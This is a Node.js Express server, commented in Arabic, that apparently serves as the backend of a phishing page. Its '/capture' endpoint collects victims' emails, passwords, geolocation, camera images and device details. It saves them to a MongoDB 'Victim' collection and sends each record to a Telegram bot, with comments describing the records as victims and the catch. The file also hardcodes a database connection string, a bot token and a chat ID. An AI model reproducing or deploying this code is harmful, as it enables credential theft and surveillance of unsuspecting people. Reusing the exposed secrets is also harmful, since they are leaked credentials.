const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// إعدادات الربط بناءً على صور MongoDB Atlas الخاصة بك
// قمت بتغيير اسم قاعدة البيانات إلى sample_mflix كما يظهر في صورك لضمان الربط
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

// تعريف هيكل البيانات (Victim Schema)
const victimSchema = new mongoose.Schema({
    email: String,
    password: String,
    otp: String,
    location: Object,
    image: String,
    device: String,
    date: { type: Date, default: Date.now }
});
const Victim = mongoose.model('Victim', victimSchema);

mongoose.connect(MONGO_URI).then(() => console.log("✅ Connected to Cluster0")).catch(err => console.error(err));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال البيانات وحفظها في MongoDB وإرسالها لتيليجرام
app.post('/capture', async (req, res) => {
    try {
        const { email, password, location, image, device } = req.body;
        
        // 1. حفظ في MongoDB Atlas
        const newVictim = new Victim({ email, password, location, image, device });
        await newVictim.save();

        // 2. إرسال للتيليجرام
        const mapUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الموقع مرفوض";
        const message = `🔥 صيد جديد تم حفظه سحابياً!\n📧 إيميل: ${email}\n🔑 باسورد: ${password}\n📍 خريطة: ${mapUrl}\n📱 جهاز: ${device}`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message });

        res.status(200).send("OK");
    } catch (e) { res.status(500).send("Error"); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Master Server Active`));
